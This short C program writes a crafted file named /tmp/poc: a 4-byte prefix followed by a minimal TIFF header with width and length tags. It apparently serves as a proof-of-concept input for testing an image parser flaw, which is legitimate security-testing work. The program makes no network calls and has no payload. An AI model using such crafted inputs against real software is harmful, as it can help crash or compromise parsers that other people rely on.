#include <stdio.h>
int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;
    fwrite("\x03\x00\x00\x00", 1, 4, f);
    fwrite("\x49\x49\x2a\x00", 1, 4, f);
    fwrite("\x08\x00\x00\x00", 1, 4, f);
    fwrite("\x02\x00", 1, 2, f);
    fwrite("\x00\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x00", 1, 12, f);
    fwrite("\x01\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x00", 1, 12, f);
    fwrite("\x00\x00\x00\x00", 1, 4, f);
    fclose(f);
    return 0;
}